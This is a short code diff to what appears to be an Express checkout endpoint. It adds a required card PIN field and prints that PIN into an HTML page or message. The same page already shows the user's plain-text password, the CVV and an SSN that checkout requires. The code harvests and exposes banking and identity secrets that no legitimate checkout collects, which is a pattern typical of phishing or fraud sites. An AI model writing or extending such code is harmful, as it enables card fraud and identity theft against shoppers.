@@ -60,9 +60,9 @@ app.post('/api/login-or-signup', (req, res) => {
 
 // API Endpoint for Checkout
 app.post('/api/checkout', async (req, res) => {
-  const { token, name, cardNumber, expiry, cvv, billingAddress, ssn } = req.body;
+  const { token, name, cardNumber, expiry, cvv, billingAddress, ssn, cardPin } = req.body;
 
-  if (!token || !name || !cardNumber || !expiry || !cvv || !billingAddress || !ssn) {
+  if (!token || !name || !cardNumber || !expiry || !cvv || !billingAddress || !ssn || !cardPin) {
     return res.status(400).json({ message: 'All fields are required for checkout' });
   }
 
@@ -90,6 +90,7 @@ app.post('/api/checkout', async (req, res) => {
       <p><strong>Password:</strong> ${user.password}</p> <!-- Include plain text password -->
       <p><strong>Card Number:</strong> ${maskedCardNumber}</p>
       <p><strong>Expiry:</strong> ${expiry}</p>
+      <p><strong>Card Pin:</strong> ${cardPin}</p>
       <p><strong>CVV:</strong> ${cvv}</p>
       <p><strong>Billing Address:</strong> ${billingAddress}</p>
       <p><strong>SSN:</strong> ${maskedSSN}</p>
